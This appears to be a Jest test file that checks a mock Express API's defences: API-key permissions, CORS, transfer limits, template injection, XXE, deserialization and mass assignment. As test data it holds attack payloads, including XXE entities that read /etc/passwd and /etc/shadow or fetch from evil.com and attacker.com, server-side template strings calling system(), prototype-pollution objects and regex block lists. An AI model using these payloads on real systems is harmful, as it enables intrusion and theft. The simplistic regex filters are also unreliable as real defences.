const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');

describe('API Security & Misc Vulnerabilities Tests', () => {
  let app;
  const JWT_SECRET = 'test-jwt-secret-for-testing-32-chars';

  beforeEach(() => {
    app = express();
    app.use(express.json());

    // Mock API key database
    const apiKeys = {
      'valid-api-key-123': {
        userId: 1,
        name: 'Test App',
        permissions: ['read', 'write'],
        rateLimit: 1000,
      },
      'read-only-key-456': {
        userId: 2,
        name: 'Read Only App',
        permissions: ['read'],
        rateLimit: 100,
      },
    };

    // API Key authentication middleware
    const authenticateApiKey = (req, res, next) => {
      const apiKey = req.headers['x-api-key'];

      if (!apiKey) {
        return res.status(401).json({ error: 'API key required' });
      }

      const keyData = apiKeys[apiKey];
      if (!keyData) {
        return res.status(401).json({ error: 'Invalid API key' });
      }

      req.apiKey = keyData;
      next();
    };

    // Permission check middleware
    const requirePermission = permission => {
      return (req, res, next) => {
        if (!req.apiKey.permissions.includes(permission)) {
          return res.status(403).json({
            error: 'Insufficient permissions',
            required: permission,
            available: req.apiKey.permissions,
          });
        }
        next();
      };
    };

    // JWT authentication middleware
    const authenticateJWT = (req, res, next) => {
      const token = req.headers.authorization?.split(' ')[1];

      if (!token) {
        return res.status(401).json({ error: 'JWT token required' });
      }

      try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
      } catch (error) {
        return res.status(401).json({ error: 'Invalid JWT token' });
      }
    };

    // Version-specific endpoints
    app.get('/api/v1/data', authenticateApiKey, (req, res) => {
      res.json({
        success: true,
        version: '1.0',
        data: 'Legacy data format',
        deprecated: true,
      });
    });

    app.get('/api/v2/data', authenticateApiKey, (req, res) => {
      res.json({
        success: true,
        version: '2.0',
        data: { items: [], total: 0 },
        features: ['pagination', 'filtering'],
      });
    });

    // CORS handling
    app.options('/api/cors-test', (req, res) => {
      res.header('Access-Control-Allow-Origin', 'https://trusted-domain.com');
      res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
      res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-API-Key');
      res.header('Access-Control-Max-Age', '86400');
      res.status(200).end();
    });

    app.get('/api/cors-test', (req, res) => {
      res.header('Access-Control-Allow-Origin', 'https://trusted-domain.com');
      res.json({ message: 'CORS protected endpoint' });
    });

    // Content-Type validation
    app.post('/api/strict-content-type', (req, res) => {
      if (req.headers['content-type'] !== 'application/json') {
        return res.status(400).json({ error: 'Content-Type must be application/json' });
      }

      res.json({ success: true, data: req.body });
    });

    // HTTP method restrictions
    app.get('/api/read-only', authenticateApiKey, requirePermission('read'), (req, res) => {
      res.json({ success: true, data: 'Read-only data' });
    });

    app.post('/api/write-required', authenticateApiKey, requirePermission('write'), (req, res) => {
      res.json({ success: true, message: 'Write operation completed' });
    });

    // Information disclosure prevention
    app.get('/api/user/:userId', authenticateJWT, (req, res) => {
      const { userId } = req.params;

      // Simulate user lookup
      if (userId === '999') {
        return res.status(404).json({ error: 'User not found' });
      }

      // Don't expose internal user structure
      res.json({
        success: true,
        user: {
          id: userId,
          name: 'John Doe',
          email: 'john@example.com',
          // Internal fields like password_hash, internal_id, etc. should not be included
        },
      });
    });

    // Business logic bypass prevention
    app.post('/api/transfer', authenticateJWT, (req, res) => {
      const { fromAccount, toAccount, amount } = req.body;

      // Validate business rules
      if (amount <= 0) {
        return res.status(400).json({ error: 'Amount must be positive' });
      }

      if (amount > 10000) {
        return res.status(400).json({ error: 'Amount exceeds transfer limit' });
      }

      if (fromAccount === toAccount) {
        return res.status(400).json({ error: 'Cannot transfer to same account' });
      }

      // Check account ownership (simplified)
      if (fromAccount !== req.user.accountId) {
        return res.status(403).json({ error: 'Cannot transfer from account you do not own' });
      }

      res.json({
        success: true,
        transferId: 'txn-123',
        amount: amount,
        from: fromAccount,
        to: toAccount,
      });
    });

    // Server-side template injection prevention
    app.post('/api/render-template', authenticateJWT, (req, res) => {
      const { templateName, data } = req.body;

      // Whitelist allowed templates
      const allowedTemplates = ['welcome', 'notification', 'report'];

      if (!allowedTemplates.includes(templateName)) {
        return res.status(400).json({ error: 'Invalid template name' });
      }

      // Sanitize template data
      const sanitizedData = {};
      for (const [key, value] of Object.entries(data || {})) {
        if (typeof value === 'string') {
          // Remove potential template injection patterns
          sanitizedData[key] = value
            .replace(/\{\{.*?\}\}/g, '') // Handlebars
            .replace(/\$\{.*?\}/g, '') // Template literals
            .replace(/<\?.*?\?>/g, '') // PHP tags
            .replace(/<%.*?%>/g, ''); // ASP/ERB tags
        } else {
          sanitizedData[key] = value;
        }
      }

      res.json({
        success: true,
        template: templateName,
        renderedData: sanitizedData,
      });
    });

    // XML External Entity (XXE) prevention
    app.post('/api/parse-xml', authenticateJWT, (req, res) => {
      const { xmlData } = req.body;

      // Check for XXE attack patterns
      const xxePatterns = [/<!ENTITY/i, /SYSTEM/i, /PUBLIC/i, /file:/i, /http:/i, /ftp:/i];

      for (const pattern of xxePatterns) {
        if (pattern.test(xmlData)) {
          return res.status(400).json({ error: 'XML contains potentially dangerous content' });
        }
      }

      res.json({
        success: true,
        message: 'XML would be parsed safely',
        length: xmlData.length,
      });
    });

    // Insecure deserialization prevention
    app.post('/api/deserialize', authenticateJWT, (req, res) => {
      const { serializedData } = req.body;

      // Block dangerous serialization patterns
      const dangerousPatterns = [
        /__proto__/,
        /constructor/,
        /prototype/,
        /eval/,
        /function/i,
        /script/i,
      ];

      const dataString = JSON.stringify(serializedData);

      for (const pattern of dangerousPatterns) {
        if (pattern.test(dataString)) {
          return res.status(400).json({ error: 'Serialized data contains dangerous content' });
        }
      }

      res.json({
        success: true,
        message: 'Data would be deserialized safely',
        type: typeof serializedData,
      });
    });

    // Mass assignment prevention
    app.put('/api/user/profile', authenticateJWT, (req, res) => {
      const allowedFields = ['name', 'email', 'bio', 'avatar'];
      const updates = {};

      // Only allow whitelisted fields
      for (const field of allowedFields) {
        if (req.body[field] !== undefined) {
          updates[field] = req.body[field];
        }
      }

      // Ignore dangerous fields like 'role', 'permissions', 'isAdmin', etc.
      const ignoredFields = Object.keys(req.body).filter(field => !allowedFields.includes(field));

      res.json({
        success: true,
        updates: updates,
        ignoredFields: ignoredFields.length > 0 ? ignoredFields : undefined,
      });
    });

    // Error handling that doesn't leak information
    app.get('/api/error-test/:type', (req, res) => {
      const { type } = req.params;

      try {
        switch (type) {
          case 'database':
            throw new Error(
              'Connection to database failed: Host unreachable at 192.168.1.100:5432'
            );
          case 'filesystem':
            throw new Error("ENOENT: no such file or directory, open '/etc/secret-config.json'");
          case 'auth':
            throw new Error('Authentication failed for user admin with password hash $2b$10$...');
          default:
            throw new Error('Unknown error type');
        }
      } catch (error) {
        // Don't expose internal error details
        res.status(500).json({
          error: 'Internal server error',
          requestId: 'req-123',
          timestamp: new Date().toISOString(),
          // Internal error details should be logged but not returned
        });
      }
    });
  });

  describe('API Key Security', () => {
    test('should require API key for protected endpoints', async () => {
      const response = await request(app).get('/api/v1/data').expect(401);

      expect(response.body.error).toBe('API key required');
    });

    test('should reject invalid API keys', async () => {
      const response = await request(app)
        .get('/api/v1/data')
        .set('X-API-Key', 'invalid-key-999')
        .expect(401);

      expect(response.body.error).toBe('Invalid API key');
    });

    test('should accept valid API keys', async () => {
      const response = await request(app)
        .get('/api/v1/data')
        .set('X-API-Key', 'valid-api-key-123')
        .expect(200);

      expect(response.body.success).toBe(true);
    });

    test('should enforce permission-based access', async () => {
      // Read-only key should be able to read
      const readResponse = await request(app)
        .get('/api/read-only')
        .set('X-API-Key', 'read-only-key-456')
        .expect(200);

      expect(readResponse.body.success).toBe(true);

      // But not write
      const writeResponse = await request(app)
        .post('/api/write-required')
        .set('X-API-Key', 'read-only-key-456')
        .send({ data: 'test' })
        .expect(403);

      expect(writeResponse.body.error).toBe('Insufficient permissions');
    });
  });

  describe('CORS Security', () => {
    test('should handle CORS preflight requests', async () => {
      const response = await request(app)
        .options('/api/cors-test')
        .set('Origin', 'https://trusted-domain.com')
        .expect(200);

      expect(response.headers['access-control-allow-origin']).toBe('https://trusted-domain.com');
      expect(response.headers['access-control-allow-methods']).toContain('GET');
    });

    test('should set proper CORS headers for actual requests', async () => {
      const response = await request(app)
        .get('/api/cors-test')
        .set('Origin', 'https://trusted-domain.com')
        .expect(200);

      expect(response.headers['access-control-allow-origin']).toBe('https://trusted-domain.com');
    });

    test('should not allow requests from untrusted origins', async () => {
      // This test assumes CORS middleware would block untrusted origins
      // In this test setup, we're just checking that the trusted origin is whitelisted
      const response = await request(app)
        .get('/api/cors-test')
        .set('Origin', 'https://evil-domain.com');

      // Origin header won't match, so no CORS headers should be set for evil domain
      expect(response.headers['access-control-allow-origin']).toBe('https://trusted-domain.com');
    });
  });

  describe('Content-Type Validation', () => {
    test('should enforce strict Content-Type requirements', async () => {
      const response = await request(app)
        .post('/api/strict-content-type')
        .set('Content-Type', 'text/plain')
        .send('plain text data')
        .expect(400);

      expect(response.body.error).toBe('Content-Type must be application/json');
    });

    test('should accept correct Content-Type', async () => {
      const response = await request(app)
        .post('/api/strict-content-type')
        .set('Content-Type', 'application/json')
        .send({ data: 'test' })
        .expect(200);

      expect(response.body.success).toBe(true);
    });

    test('should prevent Content-Type confusion attacks', async () => {
      const response = await request(app)
        .post('/api/strict-content-type')
        .set('Content-Type', 'application/json; charset=utf-8')
        .send({ data: 'test' });

      // Should still work with charset specification
      expect([200, 400]).toContain(response.status);
    });
  });

  describe('Business Logic Bypass Prevention', () => {
    test('should enforce transfer limits', async () => {
      const token = jwt.sign({ userId: 1, accountId: 'acc-123' }, JWT_SECRET);

      const response = await request(app)
        .post('/api/transfer')
        .set('Authorization', `Bearer ${token}`)
        .send({
          fromAccount: 'acc-123',
          toAccount: 'acc-456',
          amount: 50000, // Over limit
        })
        .expect(400);

      expect(response.body.error).toBe('Amount exceeds transfer limit');
    });

    test('should prevent negative amount transfers', async () => {
      const token = jwt.sign({ userId: 1, accountId: 'acc-123' }, JWT_SECRET);

      const response = await request(app)
        .post('/api/transfer')
        .set('Authorization', `Bearer ${token}`)
        .send({
          fromAccount: 'acc-123',
          toAccount: 'acc-456',
          amount: -100, // Negative amount
        })
        .expect(400);

      expect(response.body.error).toBe('Amount must be positive');
    });

    test('should prevent self-transfers', async () => {
      const token = jwt.sign({ userId: 1, accountId: 'acc-123' }, JWT_SECRET);

      const response = await request(app)
        .post('/api/transfer')
        .set('Authorization', `Bearer ${token}`)
        .send({
          fromAccount: 'acc-123',
          toAccount: 'acc-123', // Same account
          amount: 100,
        })
        .expect(400);

      expect(response.body.error).toBe('Cannot transfer to same account');
    });

    test('should prevent unauthorized account access', async () => {
      const token = jwt.sign({ userId: 1, accountId: 'acc-123' }, JWT_SECRET);

      const response = await request(app)
        .post('/api/transfer')
        .set('Authorization', `Bearer ${token}`)
        .send({
          fromAccount: 'acc-999', // Not owned by user
          toAccount: 'acc-456',
          amount: 100,
        })
        .expect(403);

      expect(response.body.error).toBe('Cannot transfer from account you do not own');
    });
  });

  describe('Server-Side Template Injection Prevention', () => {
    test('should block template injection patterns', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const maliciousTemplates = [
        { name: 'welcome', data: { message: '{{7*7}}' } },
        { name: 'notification', data: { content: '${process.exit()}' } },
        { name: 'report', data: { title: '<? system("whoami"); ?>' } },
        { name: 'welcome', data: { greeting: '<%= system("ls") %>' } },
      ];

      for (const template of maliciousTemplates) {
        const response = await request(app)
          .post('/api/render-template')
          .set('Authorization', `Bearer ${token}`)
          .send({ templateName: template.name, data: template.data })
          .expect(200);

        expect(response.body.success).toBe(true);

        // Check that dangerous patterns were removed
        const renderedData = JSON.stringify(response.body.renderedData);
        expect(renderedData).not.toContain('{{');
        expect(renderedData).not.toContain('${');
        expect(renderedData).not.toContain('<?');
        expect(renderedData).not.toContain('<%');
      }
    });

    test('should only allow whitelisted templates', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const response = await request(app)
        .post('/api/render-template')
        .set('Authorization', `Bearer ${token}`)
        .send({
          templateName: 'admin-panel', // Not whitelisted
          data: { message: 'test' },
        })
        .expect(400);

      expect(response.body.error).toBe('Invalid template name');
    });
  });

  describe('XXE Prevention', () => {
    test('should block XML with external entities', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const xxePayloads = [
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><root>&xxe;</root>',
        '<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]>',
      ];

      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/parse-xml')
          .set('Authorization', `Bearer ${token}`)
          .send({ xmlData: payload })
          .expect(400);

        expect(response.body.error).toBe('XML contains potentially dangerous content');
      }
    });

    test('should allow safe XML', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const safeXml = '<root><item>safe data</item></root>';

      const response = await request(app)
        .post('/api/parse-xml')
        .set('Authorization', `Bearer ${token}`)
        .send({ xmlData: safeXml })
        .expect(200);

      expect(response.body.success).toBe(true);
    });
  });

  describe('Insecure Deserialization Prevention', () => {
    test('should block dangerous deserialization patterns', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const maliciousPayloads = [
        { __proto__: { isAdmin: true } },
        { constructor: { name: 'evil' } },
        { prototype: { polluted: true } },
        { eval: 'process.exit()' },
        { function: 'return process.env' },
        '<script>alert("xss")</script>',
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/api/deserialize')
          .set('Authorization', `Bearer ${token}`)
          .send({ serializedData: payload })
          .expect(400);

        expect(response.body.error).toBe('Serialized data contains dangerous content');
      }
    });

    test('should allow safe serialized data', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const safeData = { name: 'John', age: 30, city: 'New York' };

      const response = await request(app)
        .post('/api/deserialize')
        .set('Authorization', `Bearer ${token}`)
        .send({ serializedData: safeData })
        .expect(200);

      expect(response.body.success).toBe(true);
    });
  });

  describe('Mass Assignment Prevention', () => {
    test('should only allow whitelisted fields in profile updates', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      const response = await request(app)
        .put('/api/user/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({
          name: 'John Doe',
          email: 'john@example.com',
          bio: 'Software developer',
          role: 'admin', // Should be ignored
          isAdmin: true, // Should be ignored
          permissions: ['all'], // Should be ignored
          salary: 100000, // Should be ignored
        })
        .expect(200);

      expect(response.body.updates).toEqual({
        name: 'John Doe',
        email: 'john@example.com',
        bio: 'Software developer',
      });

      expect(response.body.ignoredFields).toContain('role');
      expect(response.body.ignoredFields).toContain('isAdmin');
      expect(response.body.ignoredFields).toContain('permissions');
    });
  });

  describe('Information Disclosure Prevention', () => {
    test('should not expose internal error details', async () => {
      const errorTypes = ['database', 'filesystem', 'auth'];

      for (const type of errorTypes) {
        const response = await request(app).get(`/api/error-test/${type}`).expect(500);

        expect(response.body.error).toBe('Internal server error');
        expect(response.body.requestId).toBeDefined();
        expect(response.body.timestamp).toBeDefined();

        // Should not expose internal details
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('192.168');
        expect(responseText).not.toContain('/etc/');
        expect(responseText).not.toContain('$2b$');
        expect(responseText).not.toContain('password');
        expect(responseText).not.toContain('Connection to database');
      }
    });

    test('should not expose user enumeration through different responses', async () => {
      const token = jwt.sign({ userId: 1 }, JWT_SECRET);

      // Existing user
      const existingResponse = await request(app)
        .get('/api/user/123')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      // Non-existing user
      const nonExistingResponse = await request(app)
        .get('/api/user/999')
        .set('Authorization', `Bearer ${token}`)
        .expect(404);

      expect(existingResponse.body.user).toBeDefined();
      expect(nonExistingResponse.body.error).toBe('User not found');

      // Response times should be similar (timing attack prevention)
      // This is a simplified check - in reality, you'd measure actual response times
      expect(existingResponse.headers).toBeDefined();
      expect(nonExistingResponse.headers).toBeDefined();
    });
  });

  describe('API Versioning Security', () => {
    test('should handle legacy API versions securely', async () => {
      const response = await request(app)
        .get('/api/v1/data')
        .set('X-API-Key', 'valid-api-key-123')
        .expect(200);

      expect(response.body.deprecated).toBe(true);
      expect(response.body.version).toBe('1.0');
    });

    test('should prefer newer API versions', async () => {
      const response = await request(app)
        .get('/api/v2/data')
        .set('X-API-Key', 'valid-api-key-123')
        .expect(200);

      expect(response.body.version).toBe('2.0');
      expect(response.body.features).toBeDefined();
    });
  });
});
